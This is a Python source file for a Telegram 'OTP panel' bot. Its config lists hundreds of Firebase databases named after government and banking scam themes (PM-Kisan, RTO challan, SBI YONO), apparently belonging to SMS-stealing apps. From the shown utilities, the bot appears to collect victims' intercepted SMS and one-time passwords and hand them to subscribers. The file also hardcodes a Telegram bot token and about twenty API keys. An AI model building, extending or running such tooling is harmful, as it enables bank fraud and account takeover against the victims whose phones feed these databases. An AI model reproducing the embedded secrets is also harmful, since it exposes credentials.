#!/usr/bin/env python3
"""
══════════════════════════════════════════════════════════════════
        OTP PANEL BOT — ULTIMATE EDITION (1000+ USERS)           
  Fresh SMS Filter | Owner Transfer | Railway Ready | Penalty Sys
══════════════════════════════════════════════════════════════════
"""

import os
import re
import time
import json
import random
import asyncio
import logging
import ssl
import socket
from datetime import datetime
from typing import Optional, List, Dict, Any, Tuple
import aiohttp
from aiohttp import ClientTimeout, TCPConnector, ClientSession, ClientError, web
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton, ChatMemberUpdated
from telegram.error import BadRequest, NetworkError, TimedOut, RetryAfter
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ChatMemberHandler,
    filters,
    ContextTypes,
)

# 🔥 Clean Terminal Logging
logging.basicConfig(format="[%(asctime)s] %(message)s", datefmt="%I:%M:%S %p", level=logging.WARNING)
logging.getLogger("asyncio").setLevel(logging.CRITICAL)
logging.getLogger("httpx").setLevel(logging.CRITICAL)
logging.getLogger("telegram").setLevel(logging.ERROR)

# ══════════════════════════════════════════════════════════════════
#  CONFIG - CREDENTIALS & API
# ══════════════════════════════════════════════════════════════════
POLL_INTERVAL   = 8
SMS_LIMIT       = 25
PAGE_SIZE       = 10  
TOKEN           = "8218848065:AAGEg8EbJ2ArHRKfN04QMvSvD09V-wXtugY"  
BOT_USERNAME    = "freepanelssmsbot"
DB_FILE         = "bot_database.json"

REQUIRED_CHANNELS = [
    {"username": "leakmethodfree", "url": "https://t.me/leakmethodfree", "name": "Leak Method Free"},
    {"username": "sabkijayhokhush", "url": "https://t.me/sabkijayhokhush", "name": "Sabki Jay Ho Khush"},
    {"username": "rosekhudkabanaya", "url": "https://t.me/rosekhudkabanaya", "name": "Rose Khud Ka Banaya"},
]

# Advanced Worker Limiter (Prevents DNS Choke on Railway)
SCAN_SEMAPHORE = asyncio.Semaphore(15)

# ══════════════════════════════════════════════════════════════════
#  SUPERASSETS CHECKER CONFIG & PANELS
# ══════════════════════════════════════════════════════════════════
DEFAULT_CHECKER_SETTINGS = {
    "admins": [6860106371],  # 👑 Root Admin ID
    "api_keys": [
        "AK_GFyk1-ivCOsfAF_H__wiWddDaGbRGBbT",
        "AK_COqjB51-_qc-KO8lfZpKlUXu-qo9-zDQ",
        "AK_Sz7XMaFcF7F4DUYcneZ6qIv90S4NcwaP",
        "AK_iIJWhqJU-C5qGdEEvoMPy0vMyDvOJO4x",
        "AK_huue0mXg6tf4e4syA_DU7M8naJZF2TAT",
        "AK_DQDS9hMQ3M0H-ykltwotJMYpRFAC4fNg",
        "AK_Kq1ctHXEH2ansTWeY9h4BeilG5Pae0VC",
        "AK_nPBGxUCq0AWTtm1nus7TFnX1i0v0Bs5",
        "AK_jfaywkZJc6W2_JUjHKtxo3uEcJOkBNH6",
        "AK_Dooy_O2elOFy57Qjzt70FEAjBQcGD8YM",
        "AK_KYrXjwwwdLYGiGXq47FDWOoL9vvdZZmo",
        "AK_RrbWlO2Ole-pJgbmsm0mDcoOXFZ_bvJ-",
        "AK_-aF0H5eQAekk-YmU63WlpPf3MQ5oLxZV",
        "AK_31Whk-_9PxJnWJMJlS0op7kcp_ESfQTv",
        "AK_VxWU04ePsl_m66_wEx0t7iisRDsiymAd",
        "AK_bMsPDvvgkD7K5Kb_wH6tFiU9tOPnwgHb",
        "AK_LpJ9kGcHQfWIfqoN-EG-2Ngg1_yXQhLH",
        "AK_aewqEf78uV8I3V06vcEcBlESdcPGyz74",
        "AK_-EAJ5LyrnsOGlsgafV-sbg5AUsyJ-zJn",
        "AK_p4NwDAzl3aod2paD9e3UnvKVVTPdD6Dl",
        "AK_J_1R4tCvxZgqvfCEDjT1hZZjwIRB4rnU",
        "AK_-Xd_ErhFdQVLdHMB0XBEbqdf5ka3g0jh"
    ],
    "unlocked_panels": ["DB_1", "DB_2", "DB_3"], 
    "maintenance": False,
    "check_anim": "⚡",
    "stats": {"total_checks": 0, "today_checks": 0, "success": 0, "failed": 0},
}

API_KEYS_STATE = {}
API_LOCK = asyncio.Lock()

RAW_URLS = [
    "https://aaaa-b3749-default-rtdb.firebaseio.com", "https://aashish-2e04c-default-rtdb.firebaseio.com",
    "https://aaya-6e335-default-rtdb.firebaseio.com", "https://aaya2-8df9a-default-rtdb.firebaseio.com",
    "https://access20-3fc38-default-rtdb.firebaseio.com", "https://activity-e16b3-default-rtdb.firebaseio.com",
    "https://admin-822e2-default-rtdb.firebaseio.com", "https://admin-panel-2272-default-rtdb.firebaseio.com",
    "https://ai-rto-9-default-rtdb.firebaseio.com", "https://airto-abde2-default-rtdb.firebaseio.com",
    "https://aiye-a-rajesh-default-rtdb.firebaseio.com", "https://ajay-33c1b-default-rtdb.firebaseio.com",
    "https://ajna-20fc4-default-rtdb.firebaseio.com", "https://alfabomber-c746b-default-rtdb.firebaseio.com",
    "https://alpha-af0d2.firebaseio.com", "https://amirrr-8a463-default-rtdb.firebaseio.com",
    "https://anamikaadminpanel-default-rtdb.firebaseio.com", "https://ankur-2511f-default-rtdb.firebaseio.com",
    "https://annapunna-12b79-default-rtdb.firebaseio.com", "https://anvith6-9450e-default-rtdb.firebaseio.com",
    "https://apkdriod-default-rtdb.firebaseio.com", "https://apkdriod-f6fb9-default-rtdb.firebaseio.com",
    "https://apkpure-6eb6a-default-rtdb.firebaseio.com", "https://app-2-7ac78-default-rtdb.firebaseio.com",
    "https://asdtest-project-default-rtdb.firebaseio.com", "https://aya-baby-c3a6b-default-rtdb.firebaseio.com",
    "https://aya-wed-anvith-default-rtdb.firebaseio.com", "https://babu-2b2c2-default-rtdb.firebaseio.com",
    "https://badboys-16296-default-rtdb.firebaseio.com", "https://bandhan2-7jan-default-rtdb.firebaseio.com",
    "https://bank-e-kyc-default-rtdb.firebaseio.com", "https://bihar-chandan-c2af8-default-rtdb.firebaseio.com",
    "https://bihar-new-770fb-default-rtdb.firebaseio.com", "https://biharnew-2380d-default-rtdb.firebaseio.com",
    "https://biharnew2-default-rtdb.firebaseio.com", "https://billojii-default-rtdb.firebaseio.com",
    "https://bittu-2d39e-default-rtdb.firebaseio.com", "https://bob-4-a4078-default-rtdb.firebaseio.com",
    "https://boi-3-8914d-default-rtdb.firebaseio.com", "https://bossuun-default-rtdb.firebaseio.com",
    "https://bu-3-13-default-rtdb.firebaseio.com", "https://business-apps-ba1-8d27c-default-rtdb.firebaseio.com",
    "https://business-apps-ba1-f86b7-default-rtdb.firebaseio.com", "https://can-4-668a0-default-rtdb.firebaseio.com",
    "https://challan5-default-rtdb.firebaseio.com", "https://chfjfj-c2857-default-rtdb.firebaseio.com",
    "https://chhnuk05-3188e-default-rtdb.firebaseio.com", "https://ck-kumar3-default-rtdb.firebaseio.com",
    "https://colana-84ce2-default-rtdb.firebaseio.com", "https://comeback-5b876-default-rtdb.firebaseio.com",
    "https://cs23-9e709-default-rtdb.firebaseio.com", "https://cs2xc-3951e-default-rtdb.firebaseio.com",
    "https://cs6mycarry68jh-default-rtdb.firebaseio.com", "https://csforme-dc64a-default-rtdb.firebaseio.com",
    "https://csk-41-default-rtdb.firebaseio.com", "https://cust-4-a7670-default-rtdb.firebaseio.com",
    "https://cust-6-default-rtdb.firebaseio.com", "https://customer03support-default-rtdb.firebaseio.com",
    "https://dark-274b4-default-rtdb.firebaseio.com", "https://darknet-26b68-default-rtdb.firebaseio.com",
    "https://davil-d4e77-default-rtdb.firebaseio.com", "https://demon-4-default-rtdb.firebaseio.com",
    "https://desi-742d2-default-rtdb.firebaseio.com", "https://desi-balak2-default-rtdb.firebaseio.com",
    "https://dev-rahul-3ca89-default-rtdb.firebaseio.com", "https://dhani-aa151-default-rtdb.firebaseio.com",
    "https://dhheee-b95dc-default-rtdb.firebaseio.com", "https://djjd-22e61-default-rtdb.firebaseio.com",
    "https://dogla-de225-default-rtdb.firebaseio.com", "https://doxci-9daa3-default-rtdb.firebaseio.com",
    "https://drugi-numer.firebaseio.com", "https://duuu-dc41d-default-rtdb.firebaseio.com",
    "https://dwala-3d1ff-default-rtdb.firebaseio.com", "https://dyydd-c53c8-default-rtdb.firebaseio.com",
    "https://e10ttqaq-default-rtdb.firebaseio.com", "https://e14turnament2-default-rtdb.firebaseio.com",
    "https://e5turnament2-default-rtdb.firebaseio.com", "https://egale-74-default-rtdb.firebaseio.com",
    "https://fir-1fa16-default-rtdb.firebaseio.com", "https://fir-27c9e-default-rtdb.firebaseio.com",
    "https://fir-408f9-default-rtdb.firebaseio.com", "https://fires-847da-default-rtdb.firebaseio.com",
    "https://flash-v7powerengine-v7-default-rtdb.firebaseio.com", "https://flashbomber-18413-default-rtdb.firebaseio.com",
    "https://fortydata-fee65-default-rtdb.firebaseio.com", "https://fpro3indus-default-rtdb.firebaseio.com",
    "https://gaandkiaand-default-rtdb.firebaseio.com", "https://gas56-5d2b9-default-rtdb.firebaseio.com",
    "https://gggggg-979bd-default-rtdb.firebaseio.com", "https://gghhh-35b79-default-rtdb.firebaseio.com",
    "https://giagas2-default-rtdb.firebaseio.com", "https://gjhghjj-3d251-default-rtdb.firebaseio.com",
    "https://go-one-1b6b2-default-rtdb.firebaseio.com", "https://gren-ff2af-default-rtdb.firebaseio.com",
    "https://h-5-12-default-rtdb.firebaseio.com", "https://hch-cj-default-rtdb.firebaseio.com",
    "https://hdhe-4dad5-default-rtdb.firebaseio.com", "https://hdjdjdj-a73f2-default-rtdb.firebaseio.com",
    "https://hdmax1-58366-default-rtdb.firebaseio.com", "https://hehe-679dd-default-rtdb.firebaseio.com",
    "https://hello-6153b-default-rtdb.firebaseio.com", "https://hopkhfg-9981a-default-rtdb.firebaseio.com",
    "https://hospital-8707c-default-rtdb.firebaseio.com", "https://hsm2pro21-default-rtdb.firebaseio.com",
    "https://igii-1d529-default-rtdb.firebaseio.com", "https://imdum-6e873-default-rtdb.firebaseio.com",
    "https://indus-1-cec4f-default-rtdb.firebaseio.com", "https://inf-flash-default-rtdb.firebaseio.com",
    "https://jaduopop-a9a12-default-rtdb.firebaseio.com", "https://jamtar7-95f77-default-rtdb.firebaseio.com",
    "https://jamtara118-7cd20-default-rtdb.firebaseio.com", "https://jamtara123-42608-default-rtdb.firebaseio.com",
    "https://jamtara133-61d7e-default-rtdb.firebaseio.com", "https://jamtara140-73bf7-default-rtdb.firebaseio.com",
    "https://jamtara150-62b22-default-rtdb.firebaseio.com", "https://jamtara181-default-rtdb.firebaseio.com",
    "https://jamtara32-4a5f1-default-rtdb.firebaseio.com", "https://jamtara74-c231e-default-rtdb.firebaseio.com",
    "https://jayma-9ce22-default-rtdb.firebaseio.com", "https://jeet-op-default-rtdb.firebaseio.com",
    "https://jjkkkk-a6cad-default-rtdb.firebaseio.com", "https://jsjsjs-20d84-default-rtdb.firebaseio.com",
    "https://juhiishita786-67829-default-rtdb.firebaseio.com", "https://kanha-3bf53-default-rtdb.firebaseio.com",
    "https://karishmacsc-42128-default-rtdb.firebaseio.com", "https://kha-hai-default-rtdb.firebaseio.com",
    "https://kingbggbb-default-rtdb.firebaseio.com", "https://kisi-d6da8-default-rtdb.firebaseio.com",
    "https://kitter-34345-default-rtdb.firebaseio.com", "https://kitter-rajk8-default-rtdb.firebaseio.com",
    "https://kituu36-58290-default-rtdb.firebaseio.com", "https://komaljah-default-rtdb.firebaseio.com",
    "https://kumarlive1-default-rtdb.firebaseio.com", "https://kumu-f2257-default-rtdb.firebaseio.com",
    "https://lalanashish2-default-rtdb.firebaseio.com", "https://lalannew-9392c-default-rtdb.firebaseio.com",
    "https://lalannew5-default-rtdb.firebaseio.com", "https://lalansale-default-rtdb.firebaseio.com",
    "https://lalit-7b538-default-rtdb.firebaseio.com", "https://lawrence-7b55f-default-rtdb.firebaseio.com",
    "https://le-bhaii-default-rtdb.firebaseio.com", "https://loda-5029e-default-rtdb.firebaseio.com",
    "https://loda-9358c-default-rtdb.firebaseio.com", "https://lovefimus-default-rtdb.firebaseio.com",
    "https://maik-31440-default-rtdb.firebaseio.com", "https://mano99-default-rtdb.firebaseio.com",
    "https://manuwa-bb70a-default-rtdb.firebaseio.com", "https://maxa29-f652e-default-rtdb.firebaseio.com",
    "https://mayor-6f08c-default-rtdb.firebaseio.com", "https://mera-wala-71a5e-default-rtdb.firebaseio.com",
    "https://mera5-a7138-default-rtdb.firebaseio.com", "https://mithun-3d803-default-rtdb.firebaseio.com",
    "https://mman-433ae-default-rtdb.firebaseio.com", "https://mmmm-f7678-default-rtdb.firebaseio.com",
    "https://money-ace2c-default-rtdb.firebaseio.com", "https://mp-24jfg-default-rtdb.firebaseio.com",
    "https://mpari-6a6e5-default-rtdb.firebaseio.com", "https://muajob-29c86-default-rtdb.firebaseio.com",
    "https://mun4-ff5d4-default-rtdb.firebaseio.com", "https://myabtar-default-rtdb.firebaseio.com",
    "https://myadmin-38635-default-rtdb.firebaseio.com", "https://myapp-8228a-default-rtdb.firebaseio.com",
    "https://mypanelbot-default-rtdb.firebaseio.com", "https://navin512-54d6f-default-rtdb.firebaseio.com",
    "https://newappi-7661a-default-rtdb.firebaseio.com", "https://newspreding-default-rtdb.firebaseio.com",
    "https://nky0-a5870-default-rtdb.firebaseio.com", "https://nn02-7189f-default-rtdb.firebaseio.com",
    "https://paid-hack-2-default-rtdb.firebaseio.com", "https://paidhackrat-default-rtdb.firebaseio.com",
    "https://pand-c8e35-default-rtdb.firebaseio.com", "https://panel-wala-v108-default-rtdb.firebaseio.com",
    "https://panel-wala-v11-default-rtdb.firebaseio.com", "https://panel-wala-v16-default-rtdb.firebaseio.com",
    "https://panel-wala-v17-default-rtdb.firebaseio.com", "https://panel-wala-v28-default-rtdb.firebaseio.com",
    "https://panel-wala-v40-default-rtdb.firebaseio.com", "https://panel-wala-v64-default-rtdb.firebaseio.com",
    "https://panel-wala-v70-default-rtdb.firebaseio.com", "https://panel123628-default-rtdb.firebaseio.com",
    "https://parkashbhai-default-rtdb.firebaseio.com", "https://pawankumar92342038-8f702-default-rtdb.firebaseio.com",
    "https://pawanpanel-63418-default-rtdb.firebaseio.com", "https://pehla-panel-green-default-rtdb.firebaseio.com",
    "https://pinkyrani-default-rtdb.firebaseio.com", "https://pintu-8921f-default-rtdb.firebaseio.com",
    "https://pk114-6e828-default-rtdb.firebaseio.com", "https://pk175-b429e-default-rtdb.firebaseio.com",
    "https://please-2b091-default-rtdb.firebaseio.com", "https://pm-india-07bhb-default-rtdb.firebaseio.com",
    "https://pm-india-07y-gu-default-rtdb.firebaseio.com", "https://pm-kisan-01hfg-default-rtdb.firebaseio.com",
    "https://pm-kisan-03-9c8f7-default-rtdb.firebaseio.com", "https://pm-kisan-04-de0e4-default-rtdb.firebaseio.com",
    "https://pm-kisan-05jg-default-rtdb.firebaseio.com", "https://pm-kisan-111-default-rtdb.firebaseio.com",
    "https://pm-kisan-13bguh-default-rtdb.firebaseio.com", "https://pm-kisan-13gfh-default-rtdb.firebaseio.com",
    "https://pm-kisan-17hh-default-rtdb.firebaseio.com", "https://pm-kisan-18hgu-default-rtdb.firebaseio.com",
    "https://pm-kisan-20-vgg-default-rtdb.firebaseio.com", "https://pm-kisan-21gvh-default-rtdb.firebaseio.com",
    "https://pm-kisan-24dty-59dd1-default-rtdb.firebaseio.com", "https://pm-kisan-25hxg-default-rtdb.firebaseio.com",
    "https://pm-kisan-28hhj-default-rtdb.firebaseio.com", "https://pm-kisan-28jbj-default-rtdb.firebaseio.com",
    "https://pm-kisan-28ugg-default-rtdb.firebaseio.com", "https://pm-kishan-23gug-default-rtdb.firebaseio.com",
    "https://pm-kishan-24hguh-default-rtdb.firebaseio.com", "https://pm-kishan-24jfyg-default-rtdb.firebaseio.com",
    "https://pm-kishan-28bub-default-rtdb.firebaseio.com", "https://pm-kishan-30-huhj-default-rtdb.firebaseio.com",
    "https://pm-kishan-31-ea1ac-default-rtdb.firebaseio.com", "https://pm-kishan-a8-default-rtdb.firebaseio.com",
    "https://pm-kishan-b3-default-rtdb.firebaseio.com", "https://pm-kishan-b4-default-rtdb.firebaseio.com",
    "https://pm-modi-22dh-default-rtdb.firebaseio.com", "https://pm-modi-22hch-hu-default-rtdb.firebaseio.com",
    "https://pm-modi-27jff-default-rtdb.firebaseio.com", "https://pmfg-ccccc-default-rtdb.firebaseio.com",
    "https://pmkisan-9fdd5-default-rtdb.firebaseio.com", "https://pmnr1newad-default-rtdb.firebaseio.com",
    "https://pmsjdj-default-rtdb.firebaseio.com", "https://pohn-cd7ea-default-rtdb.firebaseio.com",
    "https://pojakr-d81e3-default-rtdb.firebaseio.com", "https://pp30-fc7e5-default-rtdb.firebaseio.com",
    "https://privatesok-59944-default-rtdb.firebaseio.com", "https://priyaknn-3e914-default-rtdb.firebaseio.com",
    "https://proffercelawte-default-rtdb.firebaseio.com", "https://project-f2fd6-default-rtdb.firebaseio.com",
    "https://project0809-c3674-default-rtdb.firebaseio.com", "https://project3-13fff-default-rtdb.firebaseio.com",
    "https://projectpksk05102025-default-rtdb.firebaseio.com", "https://projectpm0809-default-rtdb.firebaseio.com",
    "https://projectpm2209-default-rtdb.firebaseio.com", "https://projectrto2209-default-rtdb.firebaseio.com",
    "https://projectsb0810-default-rtdb.firebaseio.com", "https://pung-345e5-default-rtdb.firebaseio.com",
    "https://pvn7-a873a-default-rtdb.firebaseio.com", "https://r62710898-39a8e-default-rtdb.firebaseio.com",
    "https://radhe-d31aa-default-rtdb.firebaseio.com", "https://raghu-c1d6f-default-rtdb.firebaseio.com",
    "https://rahg-4564c-default-rtdb.firebaseio.com", "https://rahu80759-ac69b-default-rtdb.firebaseio.com",
    "https://rahul-54fe9-default-rtdb.firebaseio.com", "https://rahul-6bf55-default-rtdb.firebaseio.com",
    "https://rahulcscperosnl-default-rtdb.firebaseio.com", "https://rahulgandhi-d09ca-default-rtdb.firebaseio.com",
    "https://raj-kumar-63492-default-rtdb.firebaseio.com", "https://raj254346kumar-84033-default-rtdb.firebaseio.com",
    "https://raja252525raj-4ee9a-default-rtdb.firebaseio.com", "https://rajputchuttad-default-rtdb.firebaseio.com",
    "https://rajputlodu-5bed0-default-rtdb.firebaseio.com", "https://rajshoott-adminna-kutt-default-rtdb.firebaseio.com",
    "https://rajucs-bca5d-default-rtdb.firebaseio.com", "https://raki143aa-default-rtdb.firebaseio.com",
    "https://rameshwar-7okt-default-rtdb.firebaseio.com", "https://randa-2609c-default-rtdb.firebaseio.com",
    "https://randi-rona-81876-default-rtdb.firebaseio.com", "https://rando-acf5a-default-rtdb.firebaseio.com",
    "https://ranjibses-default-rtdb.firebaseio.com", "https://rantaishita-f7614-default-rtdb.firebaseio.com",
    "https://ravi-23776-default-rtdb.firebaseio.com", "https://raxtyc-default-rtdb.firebaseio.com",
    "https://rbl-7-e796b-default-rtdb.firebaseio.com", "https://rc-39-15-default-rtdb.firebaseio.com",
    "https://rdkkk-a6706-default-rtdb.firebaseio.com", "https://rexxx-4c7a7-default-rtdb.firebaseio.com",
    "https://rider-a922c-default-rtdb.firebaseio.com", "https://risho-d4c66-default-rtdb.firebaseio.com",
    "https://rmx3511uuj-default-rtdb.firebaseio.com", "https://rnd12-17508-default-rtdb.firebaseio.com",
    "https://rontem-a082b-default-rtdb.firebaseio.com", "https://root-3rto-default-rtdb.firebaseio.com",
    "https://rt51-6e1df-default-rtdb.firebaseio.com", "https://rto-10-default-rtdb.firebaseio.com",
    "https://rto-47-b39f4-default-rtdb.firebaseio.com", "https://rto-chalan-14-gyf-default-rtdb.firebaseio.com",
    "https://rto-chalan-b10ad-default-rtdb.firebaseio.com", "https://rto-e-chall-4-default-rtdb.firebaseio.com",
    "https://rto23-a5d99-default-rtdb.firebaseio.com", "https://rto50-84d38-default-rtdb.firebaseio.com",
    "https://rto68-1a61f-default-rtdb.firebaseio.com", "https://rto9-d2b33-default-rtdb.firebaseio.com",
    "https://rto91-2b27f-default-rtdb.firebaseio.com", "https://rtoadmin-49319-default-rtdb.firebaseio.com",
    "https://rtochallan-8579d-default-rtdb.firebaseio.com", "https://rtochallan8-default-rtdb.firebaseio.com",
    "https://rtomatrix-c1e78-default-rtdb.firebaseio.com", "https://rtompari-default-rtdb.firebaseio.com",
    "https://ruff-panel-default-rtdb.firebaseio.com", "https://runjun-master-panel-default-rtdb.firebaseio.com",
    "https://ruparamee-14f4b-default-rtdb.firebaseio.com", "https://s85138920-87594-default-rtdb.firebaseio.com",
    "https://salasali6990-1171d-default-rtdb.firebaseio.com", "https://samar84900-6f084-default-rtdb.firebaseio.com",
    "https://samar95476-54eb9-default-rtdb.firebaseio.com", "https://sampanel-fc525-default-rtdb.firebaseio.com",
    "https://sanj-683c4-default-rtdb.firebaseio.com", "https://sanjee-9918a-default-rtdb.firebaseio.com",
    "https://santosh-jii-default-rtdb.firebaseio.com", "https://sb35-d1851-default-rtdb.firebaseio.com",
    "https://sbi-credit-card-27-default-rtdb.firebaseio.com", "https://sbi-yono-i31an-default-rtdb.firebaseio.com",
    "https://sep12-aea6d-default-rtdb.firebaseio.com", "https://server-1-c3501-default-rtdb.firebaseio.com",
    "https://server-2-a095f-default-rtdb.firebaseio.com", "https://server-2-fb768-default-rtdb.firebaseio.com",
    "https://server-23-d1605-default-rtdb.firebaseio.com", "https://server-3-e44be-default-rtdb.firebaseio.com",
    "https://server-6-42c3b-default-rtdb.firebaseio.com", "https://server-97e23-default-rtdb.firebaseio.com",
    "https://server14-c6551-default-rtdb.firebaseio.com", "https://sexology-6fa9c-default-rtdb.firebaseio.com",
    "https://sexy-chat-c66b8-default-rtdb.firebaseio.com", "https://shooot-admin-kitter-default-rtdb.firebaseio.com",
    "https://shoot44-default-rtdb.firebaseio.com", "https://sikapro13uagtwo-default-rtdb.firebaseio.com",
    "https://singhaana-6f199-default-rtdb.firebaseio.com", "https://sirelech1-default-rtdb.firebaseio.com",
    "https://skkumar-2cb0e-default-rtdb.firebaseio.com", "https://smas-8bff8-default-rtdb.firebaseio.com",
    "https://sms-receive-22100.firebaseio.com", "https://smsmms-3b08e-default-rtdb.firebaseio.com",
    "https://spy-25-default-rtdb.firebaseio.com", "https://strom-90e84-default-rtdb.firebaseio.com",
    "https://stsfk30aug-default-rtdb.firebaseio.com", "https://suraj-30e07-default-rtdb.firebaseio.com",
    "https://suraj-b9a86-default-rtdb.firebaseio.com", "https://svi13-531bf-default-rtdb.firebaseio.com",
    "https://testing-81627-default-rtdb.firebaseio.com", "https://testingyou-2dcac-default-rtdb.firebaseio.com",
    "https://tillu-2-default-rtdb.firebaseio.com", "https://tryagainnew-58f1a-default-rtdb.firebaseio.com",
    "https://trying-90b4b-default-rtdb.firebaseio.com", "https://trypan3l-default-rtdb.firebaseio.com",
    "https://tt01-5e373-default-rtdb.firebaseio.com", "https://u13667713-dc566-default-rtdb.firebaseio.com",
    "https://u16714964-283ef-default-rtdb.firebaseio.com", "https://u24143844-c1b11-default-rtdb.firebaseio.com",
    "https://u24153206-5eef6-default-rtdb.firebaseio.com", "https://u2519579-a31aa-default-rtdb.firebaseio.com",
    "https://u25428732-91bd9-default-rtdb.firebaseio.com", "https://u25783858-e6739-default-rtdb.firebaseio.com",
    "https://u2865726-eeb1f-default-rtdb.firebaseio.com", "https://u40179853-987df-default-rtdb.firebaseio.com",
    "https://u58325342-dffc0-default-rtdb.firebaseio.com", "https://u62751482-f5b46-default-rtdb.firebaseio.com",
    "https://u62803313-e54bc-default-rtdb.firebaseio.com", "https://u66grdgh-default-rtdb.firebaseio.com",
    "https://u67583339-bf0c1-default-rtdb.firebaseio.com", "https://u72328193-47b68-default-rtdb.firebaseio.com",
    "https://u72749819-fa563-default-rtdb.firebaseio.com", "https://u75887828-b5a63-default-rtdb.firebaseio.com",
    "https://u8208372-ad1d1-default-rtdb.firebaseio.com", "https://udkudjudj-default-rtdb.firebaseio.com",
    "https://ufff-52c18-default-rtdb.firebaseio.com", "https://ujjwal-86c6e-default-rtdb.firebaseio.com",
    "https://ullusah-default-rtdb.firebaseio.com", "https://ultra-14-default-rtdb.firebaseio.com",
    "https://ultra29s25ultra-4ef28-default-rtdb.firebaseio.com", "https://ultra381144-d1af5-default-rtdb.firebaseio.com",
    "https://vdgdgd-80f1e-default-rtdb.firebaseio.com", "https://vecna-82db2-default-rtdb.firebaseio.com",
    "https://vgfffd-bef01-default-rtdb.firebaseio.com", "https://vibe-d238e-default-rtdb.firebaseio.com",
    "https://videocalls-f3434-default-rtdb.firebaseio.com", "https://virugoniya-default-rtdb.firebaseio.com",
    "https://vishnunew16-default-rtdb.firebaseio.com", "https://vsbsvs-default-rtdb.firebaseio.com",
    "https://xc04-52348-default-rtdb.firebaseio.com", "https://yes2-ead3d-default-rtdb.firebaseio.com",
    "https://yono-sb41-default-rtdb.firebaseio.com"
]

DATABASES = {f"DB_{i+1}": url for i, url in enumerate(list(set(RAW_URLS)))}

# ══════════════════════════════════════════════════════════════════
#  GLOBAL STATE & DATA CLASSES
# ══════════════════════════════════════════════════════════════════

class Device:
    __slots__ = ("id", "name", "status", "battery", "timestamp", "numbers", "device_info", "sms_path", "base_url", "db_tag")
    def __init__(self, id, name, status, battery, timestamp, numbers, device_info, sms_path, base_url, db_tag):
        self.id = id; self.name = name; self.status = status; self.battery = battery
        self.timestamp = timestamp; self.numbers = numbers; self.device_info = device_info
        self.sms_path = sms_path; self.base_url = base_url; self.db_tag = db_tag

seen_ids:  set[str] = set()   
first_run: bool     = True
_main_app: Optional[Application] = None
_http_session: Optional[aiohttp.ClientSession] = None

all_users: dict[int, dict] = {}
pending_action: dict[int, dict] = {}
user_cooldowns: dict[int, float] = {}
user_focus: dict[str, dict[int, str]] = {TOKEN: {}}  
chats_registry: dict[str, set[int]] = {TOKEN: set()} 

user_seen_unreg: dict[int, set[str]] = {}

CLONES: dict[str, dict] = {}
GLOBAL_DEVICE_CACHE: dict[str, list] = {}
SYS_SETTINGS: dict = DEFAULT_CHECKER_SETTINGS.copy()

# ══════════════════════════════════════════════════════════════════
#  DATA SAVING & LOADING
# ══════════════════════════════════════════════════════════════════

def _sync_save_data():
    try:
        clones_to_save = {}
        for t, d in CLONES.items():
            clones_to_save[t] = {
                "creator": d.get("creator"),
                "expiry": d.get("expiry"),
                "custom_db": d.get("custom_db"),
                "users": d.get("users", {}),
                "username": d.get("username", "")
            }
        data_to_dump = {"all_users": all_users, "CLONES": clones_to_save, "SYS_SETTINGS": SYS_SETTINGS}
        with open(DB_FILE, "w") as f: json.dump(data_to_dump, f, indent=4)
    except: pass

async def save_data_async(): await asyncio.to_thread(_sync_save_data)

def load_data():
    global all_users, CLONES, SYS_SETTINGS
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r") as f:
                data = json.load(f)
                for k, v in data.get("all_users", {}).items(): all_users[int(k)] = v
                for t, d in data.get("CLONES", {}).items():
                    d["users"] = {int(uk): uv for uk, uv in d.get("users", {}).items()}
                    CLONES[t] = d
                if "SYS_SETTINGS" in data:
                    SYS_SETTINGS.update(data["SYS_SETTINGS"])
        except: pass
    
    if 6860106371 not in SYS_SETTINGS.setdefault("admins", [6860106371]):
        SYS_SETTINGS["admins"].append(6860106371)

async def auto_save_loop():
    while True:
        await asyncio.sleep(60)
        await save_data_async()

async def auto_backup_loop(app: Application):
    while True:
        await asyncio.sleep(3 * 3600)  
        total_users = len(all_users)
        custom_db_users = sum(1 for u in all_users.values() if u.get("personal_dbs"))
        total_otps = sum(u.get("otp_count", 0) for u in all_users.values())
        total_api_keys = len(SYS_SETTINGS.get('api_keys', []))
        txt = f"📦 **3-HOUR AUTO BACKUP**\n━━━━━━━━━━━━━━━━━━\n👥 Total Users: {total_users}\n🔗 Users with Custom DBs: {custom_db_users}\n📩 Total OTPs Pulled: {total_otps}\n🔑 Active API Keys: {total_api_keys}"
        for adm in SYS_SETTINGS.get("admins", []):
            try: await app.bot.send_document(adm, document=open(DB_FILE, "rb"), caption=txt, parse_mode="HTML")
            except: pass

# ══════════════════════════════════════════════════════════════════
#  DUMMY WEB SERVER FOR RAILWAY HOSTING
# ══════════════════════════════════════════════════════════════════
async def dummy_web_server():
    async def handle_ping(request): return web.Response(text="Bot is running smoothly on Railway! 🚂")
    app = web.Application()
    app.router.add_get('/', handle_ping)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    tlog(f"✅ Railway Web Server started on port {port}")

# ══════════════════════════════════════════════════════════════════
#  UTILITY FUNCTIONS 
# ══════════════════════════════════════════════════════════════════

def tlog(msg: str) -> None:
    print(f"[{datetime.now().strftime('%I:%M:%S %p')}]  {msg}", flush=True)

def is_root_admin(user_id: int) -> bool:
    return user_id in SYS_SETTINGS.get("admins", [6860106371])

def is_spamming(user_id: int) -> bool:
    if is_root_admin(user_id): return False
    now = time.time()
    last_click = user_cooldowns.get(user_id, 0)
    if now - last_click < 1.0: return True
    user_cooldowns[user_id] = now
    return False

def is_vip(bot_token: str, user_id: int) -> bool:
    if bot_token == TOKEN and is_root_admin(user_id): return True
    if bot_token != TOKEN and user_id == CLONES.get(bot_token, {}).get("creator"): return True
    users_db = all_users if bot_token == TOKEN else CLONES.get(bot_token, {}).get("users", {})
    return time.time() < users_db.get(user_id, {}).get("vip_until", 0.0)

def get_vip_time_left(bot_token: str, user_id: int) -> str:
    users_db = all_users if bot_token == TOKEN else CLONES.get(bot_token, {}).get("users", {})
    left = users_db.get(user_id, {}).get("vip_until", 0.0) - time.time()
    if left <= 0: return "Not VIP"
    return f"{int(left // 3600)}h {int((left % 3600) // 60)}m"

def fmt_num(n: str) -> str:
    c = re.sub(r"\D", "", str(n))
    if c.startswith("91") and len(c) == 12: return f"+{c}"
    if len(c) == 10: return f"+91{c}"
    if len(c) > 4: return f"+{c}"
    return c

